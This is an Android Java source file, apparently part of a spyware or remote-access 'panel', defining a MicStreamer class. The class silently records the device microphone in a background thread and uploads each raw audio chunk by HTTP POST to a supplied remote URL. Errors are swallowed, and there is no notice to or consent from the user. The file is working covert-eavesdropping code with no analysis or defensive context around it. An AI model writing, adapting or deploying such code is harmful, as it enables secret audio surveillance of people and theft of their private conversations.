package com.shadow.panel;
import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
public class MicStreamer {
    private static volatile boolean running = false;
    public static void start(Context ctx, String streamUrl) {
        if (running) return;
        running = true;
        new Thread(() -> {
            int sample = 16000;
            int buf = AudioRecord.getMinBufferSize(sample, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
            AudioRecord rec = new AudioRecord(MediaRecorder.AudioSource.MIC, sample, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, buf);
            rec.startRecording();
            byte[] data = new byte[buf];
            try {
                while (running) {
                    int read = rec.read(data, 0, data.length);
                    if (read > 0) {
                        HttpURLConnection c = (HttpURLConnection) new URL(streamUrl).openConnection();
                        c.setRequestMethod("POST"); c.setDoOutput(true);
                        c.setRequestProperty("Content-Type", "audio/pcm");
                        try (OutputStream os = c.getOutputStream()) { os.write(data, 0, read); }
                        c.getResponseCode(); c.disconnect();
                    }
                }
            } catch (Exception ignored) {}
            finally { rec.stop(); rec.release(); running = false; }
        }).start();
    }
    public static void stop() { running = false; }
}
